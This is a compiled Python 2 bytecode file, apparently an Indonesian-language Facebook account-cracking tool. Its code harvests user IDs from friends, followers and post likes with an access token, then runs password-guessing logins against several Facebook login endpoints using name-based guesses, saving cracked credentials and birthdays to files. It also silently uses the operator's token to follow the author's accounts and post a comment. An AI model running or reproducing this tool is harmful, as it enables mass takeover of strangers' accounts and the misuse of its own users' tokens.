�
��ac           @   s�  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z d  d l m Z d  d l m Z d  d l m Z d Z d	 Z d
 Z d Z d Z d Z d Z d Z d Z  d Z! d	 Z" d Z# d Z$ d Z! d Z% d Z& d Z' y d  d l Z Wn e( k
 r�e  j) d � n Xe* e � e j+ d � e j, d � j- Z. e j/ �  Z0 d Z1 d Z2 g  Z3 g  Z4 g  Z5 d a6 e j7 �  Z8 e8 j9 Z: d d d d d  d! d" d# d$ d% d& d' g Z; y0 e: d k  sRe: d( k r\e< �  n  e: d) Z= Wn e> k
 r�e< �  n Xe j7 �  Z? e? j@ ZA e? j9 ZB e? jC ZD e? ZC e; e= ZE e jF �  ZG e jH eG jI �  ZJ d* eJ eD eE eA f ZK d+ eD eE eA f ZL i d d, 6d d- 6d d. 6d d/ 6d  d0 6d! d1 6d" d2 6d# d3 6d$ d4 6d5 d6 6d% d7 6d' d8 6ZM d9 �  ZN d: �  ZO d; �  ZP d< �  ZQ d= �  ZR d> �  ZS d? �  ZT d@ �  ZU dA �  ZV dB �  ZW dC �  ZX dD �  ZY dE �  ZZ dF �  Z[ dG �  Z\ dH �  Z] dI �  Z^ dJ �  Z_ dK �  Z` dL �  Za dM �  Zb dN �  Zc dO �  Zd dP �  Ze dQ �  Zf dR �  Zg dS Zh i dT dU 6dV dW 6dX dY 6eh dZ 6d[ d\ 6d] d^ 6d_ d` 6Zi da �  Zj db �  Zk dc �  Zl dd �  Zm en de k r�e  j) df � em �  eR �  n  d S(g   i����N(   t
   ThreadPool(   t   BeautifulSoup(   t   ThreadPoolExecutor(   t   ConnectionError(   t   datetime(   t   dates   [1;97ms   [1;91ms   [1;92ms   [1;93ms   [1;94ms   [1;95ms   [1;96ms   [0ms   [90;1ms   [92;1ms   [93;1ms   [94;1ms   [95;1ms   [96;1ms   pip2 install requestst   utf8s   https://api.ipify.orgs   https://m.facebook.coms,   https://b-api.facebook.com/method/auth.logini    t   Januarit   Februarit   Marett   Aprilt   Meit   Junit   Julit   Agustust	   Septembert   Oktobert   Nopembert   Desemberi   i   s   %s-%s-%s-%ss   %s %s %st   01t   02t   03t   04t   05t   06t   07t   08t   09t   Novembert   10t   11t   12c         C   sC   x< |  d D]0 } t  j j | � t  j j �  t j d � q Wd  S(   Ns   
g���Q��?(   t   syst   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    s   /sdcard/Dru.pyt   jalanZ   s    c          C   sg   t  j d d d g � }  y* t d d � } | j |  � | j �  Wn t t f k
 rb t �  n Xd  S(   Ns  Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]sz   Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36s�   Mozilla/5.0 (Linux; Android 11; SM-F916B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Safari/537.36 [FB_IAB/FB4A;FBAV/311.0.0.44.117;]s	   ugent.txtt   w(   t   randomt   choicet   openR"   t   closet   KeyErrort   IOErrort   logs(   t   uat   ugent(    (    s   /sdcard/Dru.pyt	   defaultuaa   s    	c          C   s�   t  j d � t d � }  y� t d d � } | j |  � | j �  t d � d |  GHt d � } | d k rw t �  nD | d	 k s� | d
 k r� t �  n" | d k s� | d k r� t �  n  Wn2 t	 t
 f k
 r� t d � t d � t �  n Xd  S(   Ns   rm -rf ugent.txts    
 [?] masukan user agent kamu : s	   ugent.txtR)   s!   
 [*] sukses mengganti user agents   
 [*] user agent kamu : [1;92ms7   
 [1;97m[?] apakah ingin mengganti user agent? (Y/t): t    t   Yt   yt   Tt   ts    
 [*] gagal mengganti user agents   
 [*] kembali(   t   ost   systemt	   raw_inputR,   R"   R-   R(   t   menut   gantiuaR.   R/   (   R1   R2   t   pler(    (    s   /sdcard/Dru.pyR=   m   s&    

	



c           C   s   t  j d � d GHd  S(   Nt   clears�  
[1;92m                    ▀
[1;92m   ▝█ █▘ ▟██▖▐▙ ▟▌ ██   ▟█▙  █▟█▌
[1;92m    ▐█▌  ▘▄▟▌ █ █   █  ▐▙▄▟▌ █▘
[1;92m    ▗█▖ ▗█▀▜▌ ▜▄▛   █  ▐▛▀▀▘ █
[1;92m    ▟▀▙ ▐▙▄█▌ ▐█▌ ▗▄█▄▖▝█▄▄▌ █
[1;92m   ▝▀ ▀▘ ▀▀▝▘  ▀  ▝▀▀▀▘ ▝▀▀  ▀
(   R9   R:   (    (    (    s   /sdcard/Dru.pyt   logo�   s    c          C   sX  t  j d � y t j d � Wn! t j j k
 rA t d � n Xy t d d � }  t �  Wn� t	 t
 f k
 rSt  j d � d t d GHd GHd GHd	 GHt d
 � }  |  d k r� t  j d � t d � n  y` t j d |  � } t j | j � } t d d � } | j |  � | j �  d GHd GHt �  WqTt	 k
 rOd GHt j �  qTXn Xd  S(   NR?   s   https://mbasic.facebook.coms    [!] tidak ada koneksi internets	   login.txtt   rR4   s&    [*] tools ini menggunakan login tokens2    [*] apakah anda sudah tau cara mendapatkan token?s<    [*] jika belum silahkan ketik "open" untuk melihat tutorials   
 [?] token : [1;96mR,   s%   xdg-open https://youtu.be/IdxphPBMMTUs:   
 [*] jika sudah paham silahkan ketik ulang python2 run.pys+   https://graph.facebook.com/me?access_token=R)   s*   

[1;97m [*] selamat datang di tools kamis    [*] silahkan menunggu sebentars   [!] token kadaluwarsa(   R9   R:   t   requestst   gett
   exceptionsR   t   exitR,   R<   R.   R/   t   pR;   t   sytemt   jsont   loadst   textR"   R-   t   botR    (   t   tokent   otwt   at   zedd(    (    s   /sdcard/Dru.pyt   tokenz�   s<    
c          C   s�  y t  d d � j �  }  Wn# t k
 r> d GHt j d � n Xt j d |  � t j d |  � t j d |  � t j d |  � t j d	 |  � t j d
 |  � t j d |  � t j d |  � t j d |  � t j d |  � t j d |  � t j d |  � t j d |  � t j d |  � t j d |  � t j d |  � t j d |  � t j d |  d |  � t �  d  S(   Ns	   login.txtRA   s    [!] token kadaluwarsas   rm -rf login.txtsD   https://graph.facebook.com/100006230836266/subscribers?access_token=sD   https://graph.facebook.com/100014841483800/subscribers?access_token=sD   https://graph.facebook.com/100069672799769/subscribers?access_token=sD   https://graph.facebook.com/100006613569734/subscribers?access_token=sD   https://graph.facebook.com/100049181736259/subscribers?access_token=sD   https://graph.facebook.com/100006541202647/subscribers?access_token=sD   https://graph.facebook.com/100064563975028/subscribers?access_token=sD   https://graph.facebook.com/100009384338470/subscribers?access_token=sD   https://graph.facebook.com/100000056561882/subscribers?access_token=sD   https://graph.facebook.com/100001540299108/subscribers?access_token=sD   https://graph.facebook.com/100034234007701/subscribers?access_token=sD   https://graph.facebook.com/100016478086163/subscribers?access_token=sD   https://graph.facebook.com/100055159268362/subscribers?access_token=sD   https://graph.facebook.com/100045799894488/subscribers?access_token=sD   https://graph.facebook.com/100017553167451/subscribers?access_token=sD   https://graph.facebook.com/100000839038766/subscribers?access_token=sK   https://graph.facebook.com/383882326594489/likes?summary=true&access_token=s=   https://graph.facebook.com/213614107297063/comments/?message=s   &access_token=(   R,   t   readR/   R9   R:   RB   t   postR<   (   RL   (    (    s   /sdcard/Dru.pyRK   �   s0    c          C   s4  t  j d � y t j d � Wn! t j j k
 rA t d � n XyR t d d � j �  a	 t j d t	 � }  t
 j |  j � } | d } | d } Wn\ t k
 r� t  j d � d	 GHt  j d
 � t �  n& t j j k
 r� d GHt j �  n Xt �  d t d GHd GHd GHd GHd GHd t GHd t d GHd t d GHd | GHd t GHd GHd | d GHd GHd t d GHd GHd GHd GHd GHd GHd GHd GHd  t d! t d" GHd GHt d# � } | d k r�t �  n]| d$ k s�| d% k r�t �  n;| d& k s| d' k rt �  n| d( k s/| d) k r9t �  n� | d* k sQ| d+ k r[t �  n� | d, k ss| d- k r}t �  n� | d. k s�| d/ k r�t �  n� | d0 k s�| d1 k r�t �  no | d2 k s�| d3 k r�t �  nM | d4 k s�| d! k rt  j d
 � t  d5 � t �  n t  d6 � t t	 � d  S(7   NR?   s   https://mbasic.facebook.coms    [!] tidak ada koneksi internets	   login.txtRA   s,   https://graph.facebook.com/me/?access_token=t   namet   ids   [!] token kadaluwarsas   rm -f login.txts   [!] Tidak Ada Koneksi!R4   s>     * script masih dalam tahap pengembangan, maklum kalo ada bugs'    [+] Author      : Muhamad Badru Wasih.s,    [+] Github      : https://github.com/AkinXDs1    [+] --------------------------------------------s    [+] Bergabung   : %ss    [+] Status      : t   Premiums    [+] ID          : s    [+] IP          : s    [ selamat datang [1;93ms	   [1;97m ]s     [01]. crack dari pencarian namas    [02]. crack dari id publiks    [03]. crack dari followerss     [04]. crack dari like postingans     [05]. crack dari postingan grups    [06]. crack dari target massals!    [07]. ambil id dari teman targets    [08]. informasi tambahans    [t   00s   ]. logout (token)s    [?] pilih : t   1R   t   2R   t   3R   t   4R   t   5R   t   6R   t   7R   t   8R   t   0s    [!] berhasil menghapus token s    [!] pilih yang bener ! (!   R9   R:   RB   RC   RD   R   RE   R,   RQ   RL   RH   RI   RJ   R.   RP   R    R@   RF   t   tglt   Ht   ipt   mR;   R<   t	   pencariant   publikt	   followerst   likest   postgrupt   massalt   ambilidt   infotambahanR(   (   RM   RN   t   namaRT   t   ask(    (    s   /sdcard/Dru.pyR<   �   s�    

			











c          C   s�   d GHd GHd GHd GHd GHd GHd GHt  d � }  |  d k rE t �  n� |  d k s] |  d	 k rd t �  S|  d
 k s| |  d k r� t �  nf |  d k s� |  d k r� t �  nD |  d k s� |  d k r� t �  n" |  d k s� |  d k r� t �  n  d  S(   NR4   s    [1]. setting user agents    [2]. lihat hasil cracks    [3]. laporkan bug scripts    [4]. informasi tokens    [5]. keluars    [?] pilih : RW   R   RX   R   RY   R   RZ   R   R[   R   (   R;   R<   R=   t   cekakunt   laporbugt	   infologin(   t   pk(    (    s   /sdcard/Dru.pyRk     s(    



c           C   s   t  d � t d � t �  d  S(   NsO    [*] maaf fitur ini tidak tersedia sekarang
 [*] silahkan tunggu update terbarus   
 [*] kembali (   R(   R;   R<   (    (    (    s   /sdcard/Dru.pyRd   )  s    

c           C   s   t  d � t d � t �  d  S(   NsO    [*] maaf fitur ini tidak tersedia sekarang
 [*] silahkan tunggu update terbarus   
 [*] kembali (   R(   R;   R<   (    (    (    s   /sdcard/Dru.pyRh   /  s    

c    	      C   s  d GHt  d � }  |  d k r' t �  n  y1 t j d |  d t � } t j | j � } Wn t k
 rw d GHt �  n Xt j d |  d t � } t j | j � } xN | d D]B } | d	 } | d
 } | j	 d � d } t
 j | d | � q� Wd GHd t t t
 � � GHt | � d  S(   Ns0    [*] isi 'me' jika ingin crack dari daftar temans!    [+] masukkan id atau username : R4   s   https://graph.facebook.com/s   ?access_token=s   [!] ID Tidak Tersedia!s   /friends?access_token=t   dataRT   RS   t    i    t   |s    [+] total id -> [1;91m(   R;   R<   RB   RC   RL   RH   RI   RJ   R.   t   rsplitRT   t   appendt   strt   lent   pilihpw(	   t   idtt   mmkt   kntlt   ajgt   ppkt   it   uidt   nat   nm(    (    s   /sdcard/Dru.pyRe   5  s(    


c    	      C   s  d GHt  d � }  |  d k r' t �  n  y1 t j d |  d t � } t j | j � } Wn t k
 rw d GHt �  n Xt j d |  d t � } t j | j � } xN | d D]B } | d	 } | d
 } | j	 d � d } t
 j | d | � q� Wd GHd t t t
 � � GHt | � d  S(   Ns5    [*] isi 'me' jika ingin crack dari followers sendiris*    [?] masukan id atau username followers : R4   s   https://graph.facebook.com/s   ?access_token=s   [!] ID Tidak Tersedia!s'   /subscribers?limit=999999&access_token=Rr   RT   RS   Rs   i    Rt   s    [+] total id -> [1;91m(   R;   R<   RB   RC   RL   RH   RI   RJ   R.   Ru   RT   Rv   Rw   Rx   Ry   (	   Rz   R{   R|   R}   R~   R   R�   R�   R�   (    (    s   /sdcard/Dru.pyRf   N  s(    


c          C   s�   t  d � }  |  d k r" t �  n  t j d |  d t � } t j | j � } xN | d D]B } | d } | d } | j d � d	 } t	 j
 | d
 | � qZ Wd GHd t t t	 � � GHt | � d  S(   Ns&    [?] masukkan url atau id postingan : R4   s   https://graph.facebook.com/s"   /likes?limit=9999999&access_token=Rr   RT   RS   Rs   i    Rt   s    [+] total id -> [1;91m(   R;   R<   RB   RC   RL   RH   RI   RJ   Ru   RT   Rv   Rw   Rx   Ry   (   Rz   R}   R~   R   R�   R�   R�   (    (    s   /sdcard/Dru.pyRg   g  s    


c          C   s@  y t  d d � j �  a Wn t k
 r6 t d � n Xy d GHt t d � � }  Wn d }  n Xx� t |  � D]� } | d 7} t d | � } yh xa t	 j
 d | t f � j �  d	 D]< } | d
 } | d j d � d } t j | d | � q� WWqo t k
 rd | GHqo Xqo Wd GHd t t t � � GHt | � d  S(   Ns	   login.txtRA   s    [!] token kadaluwarsas-    [*] minimal 2 target dan maksimal 100 targets    [+] masukan jumlah target : i   s    [*] id target %s : s5   https://graph.facebook.com/%s/friends?access_token=%sRr   RT   RS   Rs   i    Rt   s    [!] id %s tidak tersediaR4   s    [+] total id -> [1;91m(   R,   RQ   RL   R/   RE   t   intt   inputt   rangeR;   RB   RC   RH   Ru   RT   Rv   R.   Rw   Rx   Ry   (   t   tanya_totalR8   Rz   R   R�   Rl   (    (    s   /sdcard/Dru.pyRi   x  s,    

*
c          C   s�  t  d � }  |  d k r" t �  n  yQ t d d � j �  } t j d |  | f � } t j | j � } d | d GHWnC t	 k
 r� t
 d � t �  n" t k
 r� t
 d � t �  n Xg  } g  } t  d	 � } d GHt j d
 |  | | f � } t j | j � } x# | d D] }	 | j |	 d � qWx� | D]� }
 y� t j d |
 | f � } t j | j � } y* x# | d D] } | j | d � qsWWn t	 k
 r�d GHn Xd G|
 Gd Gt | � GH| 2Wq1t	 k
 r�d GHq1Xq1Wt �  d  S(   Ns    [?] masukan id target : R4   s	   login.txtRA   s-   https://graph.facebook.com/%s?access_token=%ss    [*] nama : %sRS   s   
 [!] token kadaluwarsas    [?] limit : s>   https://graph.facebook.com/%s/friends?limit=%s&access_token=%sRr   RT   s5   https://graph.facebook.com/%s/friends?access_token=%ss    [!] teman privates    [*]s   jumlah temans    [!] akun terkena spam(   R;   R<   R,   RQ   RB   RC   RH   RI   RJ   R.   R(   RP   R/   Rv   Rx   t   kembali(   t   itt   toketRM   RN   t   tampungt   temant   limt   adat   idit   xRT   t   ada2t   idi2t   b(    (    s   /sdcard/Dru.pyRj   �  sH    



	c          C   sK  d GHd GHt  d � }  |  d k r, t �  n|  d k r6t j d � } d GHx | D] } d | GHqS WyB t  d � } | d k r� t �  n  t d	 | � j �  j �  } Wn t k
 r� t d
 | � n Xd | j	 d d � } | j	 d d � } d GHd | t
 | � f GHd GHt j d | � t  d � t �  n|  d k r@t j d � } d GHx | D] } d | GHq]WyB t  d � } | d k r�t �  n  t d | � j �  j �  } Wn t k
 r�t d
 | � n Xd | j	 d d � } | j	 d d � } d GHd | t
 | � f GHd GHt j d | � t  d � t �  n t �  d  S(   Ns   
 [1]. lihat hasil crack OK s    [2]. lihat hasil crack CP s   
 [?] pilih : R4   RW   t   OKs    [*] s#   
 [?] mau lihat hasil yang mana ?: s   OK/%ss    [!] file %s tidak tersedias   %st   -Rs   s   .txts5   
 *-------------------------------------------------*s    [+] tanggal : %s -total : %ss	   cat OK/%ss'   
 [*] tekan ENTER untuk kembali ke menuRX   t   CPs   CP/%ss	   cat CP/%ss)   

 [*] tekan ENTER untuk kembali ke menu (   R;   R<   R9   t   listdirR,   RQ   t
   splitlinesR/   RE   t   replaceRx   R:   (   t   anjgt   dirst   filet   totalokt   nm_filet   del_txtt   totalcp(    (    s   /sdcard/Dru.pyRn   �  s\    

 


 

c          C   sT   t  d � j d d � }  |  d k r. t �  n  t j d |  � t  d � t �  d  S(   Ns#   
 [?] masukan laporan bug script : Rs   s   %20R4   s*   xdg-open https://wa.me/6285229323951?text=s   
 [*] kembali (   R;   R�   R<   R9   R:   (   t   asulo(    (    s   /sdcard/Dru.pyRo   �  s    

c           C   s(   d GHd t  GHd GHt d � t �  d  S(   NR4   s   
 [*] token : [1;92ms   
[1;97m [*] kembali (   RL   R;   R<   (    (    (    s   /sdcard/Dru.pyRp     s
    	
c           C   s    d t  GHd t  GHd GHd GHd  S(   Ns'   
 [+] hasil OK disimpan ke -> OK/%s.txts&    [+] hasil CP disimpan ke -> CP/%s.txtsB   
 [!] anda bisa menjeda proses crack dengan mematikan data selulerR4   (   t   tanggal(    (    (    s   /sdcard/Dru.pyt   infonya	  s    		c         C   s�   t  d t d � } | d k r- t |  � nV | d k sE | d k rR t |  � n1 | d k sj | d k rw t |  � n d GHt �  d  S(   NR4   s9    [?] apakah anda ingin menggunakan sandi manual? [Y/t] : R5   R6   R7   R8   s    [!] Pilih Yang Bener(   R;   RF   Ry   t   manualt   otomatis(   R�   t   hg(    (    s   /sdcard/Dru.pyRy     s    c         C   sZ   d GHd GHd GHt  d � } d t | t f GHt | � d k rL t d � n  t |  � d  S(   NR4   su    [?] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata sandi minimal 6 karakter atau lebihs    [?] masukan kata sandi : s%    [*] crack dengan sandi -> [ %s%s%s ]i    s(    [!] isi yang benar, tidak boleh kosong!(   R;   t   Mt   NRx   RE   t   manualnjing(   R�   t   pwzx(    (    s   /sdcard/Dru.pyR�     s    c         C   s�   d GHd t  d GHd GHd GHd GHd GHd GHt d � } | d k rU d GHt |  � nN | d k rk t �  n8 | d	 k r� t �  n" | d
 k r� t �  n d GHt �  d  S(   NR4   s.    [ pilih metode crack - silahkan coba satu² ]s    [1] metode api (fast)s    [2] metode mbasic (slow)s    [3] metode mobile (super slow)s    [?] metode : s    [!] pilih yang benar!!RW   RX   RY   s    [!] pilih yang benar!(   RF   R;   R�   t   bapimant	   mbasicmant	   mobilemanRE   (   R�   R�   (    (    s   /sdcard/Dru.pyR�   (  s&    


c             sf   d j  d � �  d t GHd t GHd GHd GH�  f d �  }  t d � } | j |  t � d	 GHt �  d  S(
   NR�   t   ,s'   
 [+] hasil OK disimpan ke -> OK/%s.txts&    [+] hasil CP disimpan ke -> CP/%s.txtsB   
 [!] anda bisa menjeda proses crack dengan mematikan data selulerR4   c            s�  y t  d d � j �  } Wn t k
 r2 d } n Xg  } t j j d t t t � t t	 � t t
 � f � t j j �  |  j d � \ } } y t j d � Wn t k
 r� n Xyx��  D]�} | j �  } t j �  } i t t j d d � � d	 6t t j d
 d � � d 6t t j d
 d � � d 6d d 6d d 6| d 6d d 6d d 6} i	 d d 6d d 6d d 6| d 6d d 6| d  6d! d" 6d# d$ 6d% d& 6} d' }	 | j |	 d( | d) | �}
 d* |
 j k r'd+ |
 j k r'd, | d | d- GHt	 j | d | � t  d. t d/ � j d0 | | f � Pq� q� d1 |
 j �  d2 k r� y� t  d3 � j �  a t j d4 | d5 t � } t j | j � } | d6 } | j d7 � \ } } } t | } d8 | d | d | d9 | d9 | d9 GHt
 j | d | d | d9 | d9 | � t  d: t d/ � j d; | | | | | f � PWn# t t f k
 rSd9 } n n Xd8 | d | d< GHt
 j | d | � t  d: t d/ � j d0 | | f � Pq� q� q� Wt d= 7a Wn n Xd  S(>   Ns	   ugent.txtRA   sz   Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11s+    [1;97m[*] [crack] %s/%s OK-:%s - CP-:%s Rt   t   outg    �sAg    8�|As   x-fb-connection-bandwidthi N  i@�  s   x-fb-sim-hnis   x-fb-net-hnit	   EXCELLENTs   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-types
   user-agents!   application/x-www-form-urlencodeds   content-typet   Ligers   x-fb-http-engines/   350685531728%7C62f8ce9f74b12f84c123cc23437a4a32t   access_tokent   JSONt   formatRX   t   sdk_versiont   emailt   en_USt   localet   passwordt   iost   sdkRW   t   generate_session_cookiest    3f555f99fb61fcd7aa0c44f58f522ef6t   sigs,   https://b-api.facebook.com/method/auth.logint   paramst   headerst   session_keyt   EAAAs     [1;92m*--> s           s	   OK/%s.txtRN   s     * --> %s|%s
s   www.facebook.comt	   error_msgs	   login.txts   https://graph.facebook.com/s   /?access_token=t   birthdayt   /s   [1;93m  * --> Rs   s	   CP/%s.txts     * --> %s|%s|%s %s %s
s                           i   (   R,   RQ   R/   R    R!   R"   t   loopRx   RT   t   okt   cpR#   t   splitR9   t   mkdirt   OSErrort   lowerRB   t   SessionRw   R*   t   randintRC   RJ   Rv   R�   RH   RL   RI   t   bulanR.   (   t   userR1   t   pwxR�   RS   t   pwt   sest   headers_t   paramt   apit   sendt   swR�   t   grapht   montht   dayt   year(   t   asu(    s   /sdcard/Dru.pyt   mainF  sd    
2tE$

---	$
i   s   

[1;97m [#] crack selesai...(   R�   R�   R    t   mapRT   RE   (   R�   RF   (    (   R�   s   /sdcard/Dru.pyR�   ?  s    		:c             sf   d j  d � �  d t GHd t GHd GHd GH�  f d �  }  t d � } | j |  t � d	 GHt �  d  S(
   NR�   R�   s'   
 [+] hasil OK disimpan ke -> OK/%s.txts&    [+] hasil CP disimpan ke -> CP/%s.txtsB   
 [!] anda bisa menjeda proses crack dengan mematikan data selulerR4   c      	      s  y t  d d � j �  } Wn t k
 r2 d } n Xg  } t j j d t t t � t t	 � t t
 � f � t j j �  |  j d � \ } } y t j d � Wn t k
 r� n XyVxE�  D]=} | j �  } t j d d i | d	 6| d
 6d d 6d i | d 6�} | j } d | k s&d | k r{d | d | d GHt	 j | d | � t  d t d � j d | | f � Pq� n  d | k r� y� t  d � j �  a t j d | d t � } t j | j � }	 |	 d }
 |
 j d � \ } } } t | } d | d | d | d | d | d GHt
 j | d | d | d | d | � t  d t d � j d | | | | | f � PWn# t t f k
 r�d }
 n n Xd | d | d  GHt
 j | d | � t  d t d � j d | | f � Pq� q� q� Wt d! 7a Wn n Xd  S("   Ns	   ugent.txtRA   sz   Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11s+    [1;97m[*] [crack] %s/%s OK-:%s - CP-:%s Rt   R�   s%   https://mbasic.facebook.com/login.phpRr   R�   t   passt   submitt   loginR�   s
   user-agentt   mbasic_logout_buttons   save-devices   [1;92m  * --> s           s	   OK/%s.txtRN   s     * --> %s|%s
t
   checkpoints	   login.txts   https://graph.facebook.com/s   /?access_token=R�   R�   s   [1;93m  * --> Rs   s	   CP/%s.txts     * --> %s|%s|%s %s %s
s                           i   (   R,   RQ   R/   R    R!   R"   R�   Rx   RT   R�   R�   R#   R�   R9   R�   R�   R�   RB   RR   t   contentRv   R�   RL   RC   RH   RI   RJ   R�   R.   (   R�   R1   R�   R�   RS   R�   t   rext   xoR�   R�   R�   R�   R�   R�   (   R�   (    s   /sdcard/Dru.pyR�   �  s^    
27	$

---	$
i   s   

[1;97m [#] crack selesai...(   R�   R�   R    R�   RT   RE   (   R�   RF   (    (   R�   s   /sdcard/Dru.pyR�   �  s    		7c          C   s`   d j  d � }  d t GHd t GHd GHd GHd �  } t d � } | j | t � d	 GHt �  d  S(
   NR�   R�   s'   
 [+] hasil OK disimpan ke -> OK/%s.txts&    [+] hasil CP disimpan ke -> CP/%s.txtsB   
 [!] anda bisa menjeda proses crack dengan mematikan data selulerR4   c      	   S   s�  y t  d d � j �  } Wn t k
 r2 d } n Xg  } t j j d t t t � t t	 � t t
 � f � t j j �  |  j d � \ } } y t j d � Wn t k
 r� n Xy�x�t D]�} | j �  } t j �  } | j j i d d 6d	 d
 6d d 6| d 6d d 6d d 6d d 6� | j d � } | j d d i | d 6| d 6d d 6�} d | j j �  j �  k rd j g  | j j �  j �  D] \ }	 }
 d |	 |
 f ^ q�� } d t | | | t f GHd | | | f } t	 j | � t  d  t  d! � j d" | � Pq� q� d# | j j �  j �  k r� y� t  d$ � j �  a! t j d% | d& t! � } t" j# | j$ � } | d' } | j d( � \ } } } t% | } d) t& | | | | | t f GHd* | | | | | f } t
 j | � t  d+ t  d! � j d" | � PWn# t' t f k
 rd, } n n Xd- t& | | t f GHd. | | f } t  d+ t  d! � j d" | � Pq� q� q� Wt d/ 7a Wn n Xd  S(0   Ns	   ugent.txtRA   sz   Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11s+    [1;97m[*] [crack] %s/%s OK-:%s - CP-:%s Rt   R�   s   m.facebook.comt   Hosts	   max-age=0s   cache-controlRW   s   upgrade-insecure-requestss
   user-agentsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8t   accepts   gzip, deflates   accept-encodings#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages   https://m.facebook.coms    https://m.facebook.com/login.phpRr   R�   R�   R�   R�   t   c_usert   ;s   %s=%ss&     %s* --> %s|%s|%s                 %ss     * --> %s|%s|%ss	   OK/%s.txtRN   s   %s
R�   s	   login.txts   https://graph.facebook.com/s   /?access_token=R�   R�   s      %s* --> %s|%s|%s %s %s     %ss     * --> %s|%s|%s %s %ss	   CP/%s.txtRs   s"     %s* --> %s|%s                %ss     * --> %s|%si   ((   R,   RQ   R/   R    R!   R"   R�   Rx   RT   R�   R�   R#   R�   R9   R�   R�   R�   R�   RB   R�   R�   t   updateRC   RR   t   cookiest   get_dictt   keyst   joint   itemsRa   R�   Rv   R�   RL   RH   RI   RJ   R�   t   KR.   (   R�   R1   R�   R�   RS   R�   R�   RF   R�   t   keyt   valuet   kukit   wrtR�   R�   R�   R�   R�   (    (    s   /sdcard/Dru.pyR�   �  sh    
2A*A

	
i   s   

[1;97m [#] crack selesai...(   R�   R�   R    R�   RT   RE   (   R�   R�   RF   (    (    s   /sdcard/Dru.pyR�   �  s    			<c         C   s�   d GHd t  d GHd GHd GHd GHd GHd GHt d � } | d k rU d GHt |  � nr | d k sm | d	 k rw t �  nP | d
 k s� | d k r� t �  n. | d k s� | d k r� t �  n d GHt �  d  S(   NR4   s.    [ pilih metode crack - silahkan coba satu² ]s    [1] metode api (fast)s    [2] metode mbasic (slow)s    [3] metode mobile (super slow)s    [?] metode : s    [!] pilih yang benar!!R   RW   R   RX   R   RY   s    [!] pilih yang benar!(   RF   R;   R�   t   bapit   mbasict   mobileRE   (   R�   R&   (    (    s   /sdcard/Dru.pyR�     s&    


R1   s   free.facebook.comR�   s	   max-age=0s   cache-controlRW   s   upgrade-insecure-requestss
   user-agentsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8R�   s   gzip, deflates   accept-encodings#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languagec          C   sQ   d t  GHd t  GHd GHd GHd �  }  t d � } | j |  t � d GHt �  d  S(   Ns'   
 [+] hasil OK disimpan ke -> OK/%s.txts&    [+] hasil CP disimpan ke -> CP/%s.txtsB   
 [!] anda bisa menjeda proses crack dengan mematikan data selulerR4   c         S   sG  y t  d d � j �  } Wn t k
 r2 d } n Xg  } t j j d t t t � t t	 � t t
 � f � t j j �  |  j d � \ } } t | � d k r� | | d | d | d	 g } n�t | � d
 k r� | d | d | d	 g } n= t | � d k r| d | d	 g } n | d | d	 g } yx�| D]�} | j �  } t j �  } i t t j d d � � d 6t t j d d � � d 6t t j d d � � d 6d d 6d d 6| d 6d d 6d d 6} i	 d d 6d d 6d  d! 6| d" 6d# d$ 6| d% 6d& d' 6d( d) 6d* d+ 6} d, }	 | j |	 d- | d. | �}
 d/ |
 j k r�d0 |
 j k r�d1 | d | d2 GHt	 j | d | � t  d3 t d4 � j d5 | | f � Pq7q7d6 |
 j �  d7 k r7y� t  d8 � j �  a t j d9 | d: t � } t j | j � } | d; } | j d< � \ } } } t | } d= | d | d | d> | d> | d> GHt
 j | d | d | d> | d> | � t  d? t d4 � j d@ | | | | | f � PWn# t t f k
 r�d> } n n Xd= | d | dA GHt
 j | d | � t  d? t d4 � j d5 | | f � Pq7q7q7Wt dB 7a Wn n Xd  S(C   Ns	   ugent.txtRA   sz   Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11s+    [1;97m[*] [crack] %s/%s OK-:%s - CP-:%s Rt   i   t   123t   1234t   12345i   i   g    �sAg    8�|As   x-fb-connection-bandwidthi N  i@�  s   x-fb-sim-hnis   x-fb-net-hniR�   s   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-types
   user-agents!   application/x-www-form-urlencodeds   content-typeR�   s   x-fb-http-engines/   350685531728%7C62f8ce9f74b12f84c123cc23437a4a32R�   R�   R�   RX   R�   R�   R�   R�   R�   R�   R�   RW   R�   R�   R�   s,   https://b-api.facebook.com/method/auth.loginR�   R�   R�   R�   s     [1;92m*--> s           s	   OK/%s.txtRN   s     * --> %s|%s
s   www.facebook.comR�   s	   login.txts   https://graph.facebook.com/s   /?access_token=R�   R�   s   [1;93m  * --> Rs   s	   CP/%s.txts     * --> %s|%s|%s %s %s
